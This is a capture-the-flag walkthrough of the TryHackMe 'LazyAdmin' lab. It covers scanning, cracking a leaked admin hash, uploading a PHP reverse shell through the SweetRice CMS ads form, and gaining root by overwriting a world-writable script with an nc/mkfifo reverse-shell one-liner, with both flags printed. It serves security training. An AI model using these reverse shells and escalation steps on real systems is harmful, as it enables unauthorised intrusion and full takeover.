# Room Information

Room link: https://tryhackme.com/room/lazyadmin

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/27/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.165.242 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 18:46 EDT
Nmap scan report for 10.10.165.242
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.165.242 > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 27 18:53:42 2023
URL_BASE: http://10.10.165.242/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.165.242/ ----
==> DIRECTORY: http://10.10.165.242/content/              
+ http://10.10.165.242/index.html (CODE:200|SIZE:11321)        
+ http://10.10.165.242/server-status (CODE:403|SIZE:278)                                                          
---- Entering directory: http://10.10.165.242/content/ ----
==> DIRECTORY: http://10.10.165.242/content/_themes/             
==> DIRECTORY: http://10.10.165.242/content/as/               
==> DIRECTORY: http://10.10.165.242/content/attachment/       
==> DIRECTORY: http://10.10.165.242/content/images/    
==> DIRECTORY: http://10.10.165.242/content/inc/       
+ http://10.10.165.242/content/index.php (CODE:200|SIZE:2199)      
==> DIRECTORY: http://10.10.165.242/content/js/                                                                   
---- Entering directory: http://10.10.165.242/content/_themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                               
---- Entering directory: http://10.10.165.242/content/as/ ----
+ http://10.10.165.242/content/as/index.php (CODE:200|SIZE:3678)    
==> DIRECTORY: http://10.10.165.242/content/as/js/     
==> DIRECTORY: http://10.10.165.242/content/as/lib/                                                                 
---- Entering directory: http://10.10.165.242/content/attachment/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/as/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/as/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jun 27 19:14:26 2023
DOWNLOADED: 13836 - FOUND: 4
```

# 
> Checking Out the Directories
6. `firefox "http://{TARGET IP}/content/inc` to launch Firefox and redirect it to the target's **/content/inc** directory

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/inc.png)
7. `firefox "http://{TARGET IP}/content/inc/mysql_backup/"` to launch Firefox and redirect it to the target's **/content/inc/mysql_backup** directory and download the MySQL backup file

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/mysql_backup.png)
8. `cd ~/Downloads` to change to the **~/Downloads** directory on our machine since that's where our MySQL backup file should be
9. `ls` to verify if the file has been successfully downloaded onto our machine, which it has
10. `cat {BACKUP FILE}.sql` to output the backup file's contents onto our terminal, which outputs what seemed to be a bunch of SQL queries that can be used to create tables, and if we look a bit closer, we can see that this file contains a username and that username's password hash
```bash
┌──(kali㉿kali)-[~]
└─$ cd Downloads
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat mysql_bakup_20191129023059-1.5.1.sql 
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
  3 => 'CREATE TABLE `%--%_category` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `link` varchar(128) NOT NULL,
  `title` text NOT NULL,
  `description` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `sort_word` text NOT NULL,
  `parent_id` int(10) NOT NULL DEFAULT \'0\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `link` (`link`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
  5 => 'CREATE TABLE `%--%_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT \'\',
  `email` varchar(255) NOT NULL DEFAULT \'\',
  `website` varchar(255) NOT NULL,
  `info` text NOT NULL,
  `post_id` int(10) NOT NULL DEFAULT \'0\',
  `post_name` varchar(255) NOT NULL,
  `post_cat` varchar(128) NOT NULL,
  `post_slug` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `ip` varchar(39) NOT NULL DEFAULT \'\',
  `reply_date` int(10) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
  7 => 'CREATE TABLE `%--%_item_data` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `data_type` varchar(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`),
  KEY `item_type` (`item_type`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
  9 => 'CREATE TABLE `%--%_item_plugin` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
  11 => 'CREATE TABLE `%--%_links` (
  `lid` int(10) NOT NULL AUTO_INCREMENT,
  `request` text NOT NULL,
  `url` text NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
  13 => 'CREATE TABLE `%--%_options` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` mediumtext NOT NULL,
  `date` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>
```
11. `firefox "https://crackstation.net/"` to launch Firefox and redirect it to **crackstation.net** to attempt to crack the discovered user's password hash, which worked in the end and managed to crack the password hash for us

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Crackstation.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Crackstation%20Password%20Cracked.png)
13. `firefox "http://{TARGET IP}/content/as"` to launch Firefox and redirect it to the target's **/content/as**, which turned out to be a login page, for which we can log in to using the new set of credentials that we found and cracked

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/as.png)

# Vulnerability Identification
> Command Injection
13. `firefox "http://10.10.165.242/content/as/?type=ad"` to launch Firefox and redirect it to the **/content/as/?type=ad** page to see if anything that we create and upload here will be uploaded into the **/content/inc/ads** directory that we saw earlier in the **/content/inc** directory

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad.png)
14. `firefox "http://{TARGET IP}/content/inc/ads"` to launch Firefox and redirect it to **/content/inc/ads** directory to see if the test ad that we created and uploaded gets saved here, which it did as a PHP (.php) file

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad%20Success.png)

# Vulnerability Exploitation
> PHP Reverse Shell
11. `git clone https://github.com/pentestmonkey/php-reverse-shell`
12. `ls`
13. `cd php-reverse-shell`
14. `ls`
15. `mousepad php-reverse-shell.php`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ git clone https://github.com/pentestmonkey/php-reverse-shell
Cloning into 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Receiving objects: 100% (10/10), 9.81 KiB | 590.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
 php-reverse-shell
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cd php-reverse-shell
```
```bash
┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
└─$ ls
CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
```
```bash
┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
└─$ mousepad php-reverse-shell.php
```
![]()
16. `nc -lvnp {PORT NUMBER}`
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999                            
listening on [any] 9999 ...
```
17 `firefox "http://10.10.165.242/content/as/?type=ad"`
![]()
18. Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
![]()
19. `firefox "http://10.10.165.242/content/inc/ads/"`
![]()
20. Click on it
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999                            
listening on [any] 9999 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 46436
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 05:02:10 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
21. `ls`
22. `ls /home`
23. `ls /home/{USER}`
24. `cat /home/{USER}/{USER FLAG}.txt`
```bash
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
```bash
$ ls /home
itguy
```
```bash
$ ls /home/itguy
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
```
```bash
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

# Post Exploitation
> Privilege Escalation
25. `sudo -l`
```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
26. `cat /home/{USER}/{FILENAME3}.pl`
```bash
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
27. `cat /etc/{FILENAME4}.sh`
28. `ls -ali /etc/{FILENAME4}.sh`
```bash
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
```bash
$ ls -ali /etc/copy.sh
1050508 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
29. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
30. `nc -lvnp {PORT NUMBER}`
31. `sudo /usr/bin/perl /home/itguy/backup.pl`
```bash
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.54.63 9998 >/tmp/f" > /etc/copy.sh
```
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9998
listening on [any] 9998 ...
```
```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
```
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 38970
/bin/sh: 0: can't access tty; job control turned off
# 
```
32. `whoami`
33. `ls /root`
34. `cat /root/{ROOT FLAG}.txt`
```bash
# whoami
root
```
```bash
# ls /root
root.txt
```
```bash
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

**Room completed!**
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20LazyAdmin.png)

# Command History

# Dissecting Some Commands

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/


